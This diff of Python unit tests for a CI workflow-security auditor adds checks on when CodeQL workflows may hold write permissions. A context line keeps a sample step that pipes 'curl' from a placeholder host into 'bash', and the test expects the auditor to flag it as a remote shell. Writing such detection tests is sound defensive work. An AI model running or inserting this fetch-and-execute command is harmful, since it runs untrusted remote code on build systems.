@@ -34,6 +34,18 @@ class WorkflowPolicyTests(unittest.TestCase):
     def test_remote_shell(self):
         self.check(BASE + "      - run: curl https://example.invalid/a | bash\n", "remote shell")
 
+    def test_codeql_scoped_upload_allowed(self):
+        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\n"
+        self.assertEqual([], audit(sample, "codeql.yml"))
+
+    def test_codeql_contents_write_rejected(self):
+        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\ncontents: write\n"
+        self.check(sample, "write permission")
+
+    def test_non_codeql_write_rejected(self):
+        sample = BASE.replace("on: [push]", "on:\n  pull_request:") + "security-events: write\n"
+        self.check(sample, "write permission")
+
     def test_local_action(self):
         self.assertEqual([], audit(BASE.replace(PIN, "./.github/actions/test"), "test.yml"))
 
